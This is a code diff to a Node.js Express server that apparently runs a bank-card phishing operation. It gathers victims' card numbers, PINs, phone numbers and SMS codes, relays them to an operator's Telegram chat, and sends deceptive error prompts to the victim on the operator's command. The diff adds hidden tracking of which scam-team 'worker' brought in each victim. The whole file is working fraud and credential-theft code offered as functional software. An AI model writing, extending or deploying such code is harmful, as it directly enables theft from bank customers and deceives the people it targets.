@@ -1,10 +1,11 @@
-// server.js (исправленный — сохранён оригинальный функционал + сохранение worker)
+// server.js (полностью готовый — worker скрыт для пользователя)
 const express = require('express');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 const path = require('path');
 require('dotenv').config();
+const crypto = require('crypto');
 
 // =======================================================================
 // --- НАСТРОЙКИ: Используйте env vars ---
@@ -29,8 +30,19 @@ app.use((req, res, next) => {
     next();
 });
 
-// Обслуживание index.html из корня
+const sessions = new Map();
+
+// Обслуживание index.html + сохранение worker на сервере (не виден клиенту)
 app.get('/', (req, res) => {
+    const worker = req.query.worker; // получаем ?worker=@ник
+    const sessionId = req.query.sessionId || crypto.randomBytes(8).toString('hex');
+
+    if (worker) {
+        const existing = sessions.get(sessionId) || {};
+        sessions.set(sessionId, { ...existing, worker });
+        console.log(`Сессия ${sessionId}: worker = ${worker}`);
+    }
+
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
@@ -59,7 +71,6 @@ const server = require('http').createServer(app);
 const wss = new WebSocket.Server({ server });
 
 const clients = new Map();
-const sessions = new Map();
 
 wss.on('connection', (ws) => {
     console.log('Client connected');
@@ -91,12 +102,12 @@ app.post('/api/submit', (req, res) => {
     console.log('API /submit:', req.body);
     const { sessionId, isFinalStep, ...stepData } = req.body;
 
-    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`); // Дебаг лог
+    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);
 
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
 
-    // 👈 добавлено: сохраняем воркера из query-параметра ссылки (например ?worker=@vasya)
+    // worker уже сохранён при GET /, при необходимости обновим
     if (req.query && req.query.worker) {
         newData.worker = req.query.worker;
     }
@@ -108,7 +119,6 @@ app.post('/api/submit', (req, res) => {
         message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
 
-        // 👈 добавлено: указываем воркера если есть
         if (newData.worker) {
             message += `<b>👤 Worker:</b> ${newData.worker}\n`;
         }
@@ -140,7 +150,6 @@ app.post('/api/submit', (req, res) => {
         const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
         message += `<b>Кількість переходів:</b> ${visitText}\n`;
 
-        // 👈 добавлено: указываем воркера если есть
         if (newData.worker) {
             message += `<b>👤 Worker:</b> ${newData.worker}\n`;
         }
@@ -154,13 +163,16 @@ app.post('/api/submit', (req, res) => {
 app.post('/api/sms', (req, res) => {
     console.log('API /sms:', req.body);
     const { sessionId, code } = req.body;
-    console.log(`SMS for ${sessionId}: code=${code}`); // Дебаг лог
+    console.log(`SMS for ${sessionId}: code=${code}`);
     const sessionData = sessions.get(sessionId);
     if (sessionData) {
         let message = `<b>Отримано SMS!</b>\n\n`;
         message += `<b>Код:</b> <code>${code}</code>\n`;
         message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
+        if (sessionData.worker) {
+            message += `<b>👤 Worker:</b> ${sessionData.worker}\n`;
+        }
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         console.log(`SMS code received for session ${sessionId}`);
         res.status(200).json({ message: 'OK' });
@@ -222,7 +234,7 @@ bot.on('callback_query', (callbackQuery) => {
                 commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
                 break;
             case 'card_error':
-                commandData = { text: "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно" };
+                commandData = { text: "Вказано невірний номер картки, натисніть кнопку назад та введіть номер картки вірно" };
                 break;
             case 'number_error':
                 commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
